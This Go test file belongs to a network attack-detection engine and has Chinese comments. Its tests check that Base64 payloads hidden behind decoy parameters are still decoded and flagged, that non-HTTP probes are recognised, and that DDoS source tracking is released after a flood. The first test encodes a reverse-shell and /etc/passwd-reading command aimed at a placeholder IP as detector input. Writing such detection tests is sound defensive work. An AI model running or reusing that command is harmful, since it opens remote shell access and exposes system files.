package detect

import (
	"encoding/base64"
	"fmt"
	"strings"
	"testing"
	"time"

	"netsa/internal/config"
	"netsa/internal/model"
)

// 编码片段的名额只计产生命中的片段：前面放 8 个带撇号、括号的无害 Base64 参数，后面真正的编码载荷照样解码命中。
func TestDecodedDecoysDoNotExhaust(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	payload := base64.StdEncoding.EncodeToString([]byte("cat /etc/passwd; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
	decoy := base64.StdEncoding.EncodeToString([]byte("it's a nice day (really) Abc"))
	var b strings.Builder
	b.WriteString("/api?")
	for i := range 8 {
		fmt.Fprintf(&b, "t%d=%s&", i, decoy)
	}
	b.WriteString("cmd=" + payload)
	hits := e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Host: "a.example.com", Method: "GET", URI: b.String(), Status: 404, Bytes: 100, UA: "Mozilla/5.0"})
	found := false
	for _, h := range hits {
		if strings.Contains(h.Evidence, "解码后") && (h.Category == CatCmdExec || h.Category == CatTraversal) {
			found = true
		}
	}
	if !found {
		t.Fatalf("诱饵片段之后的编码载荷应解码命中: %+v", hits)
	}
	// 只有诱饵：不产生命中
	for _, h := range e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Host: "a.example.com", Method: "GET",
		URI: "/api?a=" + decoy + "&b=" + decoy, Status: 200, Bytes: 100, UA: "Mozilla/5.0"}) {
		if strings.Contains(h.Evidence, "解码后") {
			t.Fatalf("无害的编码文字不应命中: %+v", h)
		}
	}
}

// 没有方法、路径以 / 开头的访问日志（JSON 日志只记了 uri）不是非 HTTP 协议探测。
func TestEmptyMethodNotNonHTTP(t *testing.T) {
	e, err := NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	for _, h := range e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Host: "www.victim.com", URI: "/index.html", Status: 200,
		UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}) {
		if h.RuleID == "proto-nonhttp" {
			t.Fatalf("缺少方法字段的正常访问不应判为非HTTP协议探测: %+v", h)
		}
	}
	hits := e.Inspect(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.1", Host: "www.victim.com", URI: "\x16\x03\x01\x02\x00\x01", Status: 400})
	found := false
	for _, h := range hits {
		found = found || h.RuleID == "proto-nonhttp"
	}
	if !found {
		t.Fatalf("TLS 握手发往 HTTP 端口仍应判为非HTTP协议探测: %+v", hits)
	}
}

// 洪泛结束、窗口过去之后，多源 DDoS / 分布式 CC 的来源集合被释放（只保留基线），合计来源数归零。
func TestSurgeSourcesReleased(t *testing.T) {
	th := config.Default().Detect.Thresholds
	b := NewBehavior(th)
	t0 := time.Date(2026, 11, 5, 8, 0, 0, 0, time.UTC)
	for i := range 5000 {
		b.Observe(&model.Event{Kind: model.KindFirewall, SrcIP: fmt.Sprintf("45.%d.%d.%d", 10+i/62500, i/250%250, i%250+1), DstIP: "43.242.97.38",
			DstPort: 443, Proto: "tcp", Action: model.ActionAllow, Time: t0.Add(time.Duration(i) * time.Millisecond)})
		b.Observe(&model.Event{Kind: model.KindWeb, SrcIP: fmt.Sprintf("46.%d.%d.%d", 10+i/62500, i/250%250, i%250+1), Host: "www.example.com",
			Method: "GET", URI: fmt.Sprintf("/p%d", i%600), Status: 200, Time: t0.Add(time.Duration(i) * time.Millisecond)})
	}
	b.mu.Lock()
	defer b.mu.Unlock()
	if b.dstSrcN == 0 || b.siteSrcN == 0 {
		t.Fatalf("洪泛期间应记录来源: %d %d", b.dstSrcN, b.siteSrcN)
	}
	b.pruneSurge(t0.Add(2 * time.Hour))
	d := b.dsts[dstKey{"43.242.97.38", 443}]
	s := b.sites["www.example.com"]
	if d == nil || s == nil {
		t.Fatal("基线应保留到 24 小时")
	}
	if len(d.srcs) != 0 || len(s.srcs) != 0 || len(s.paths) != 0 || b.dstSrcN != 0 || b.siteSrcN != 0 {
		t.Fatalf("窗口过去后来源集合应释放: dst=%d site=%d paths=%d n=%d/%d", len(d.srcs), len(s.srcs), len(s.paths), b.dstSrcN, b.siteSrcN)
	}
}
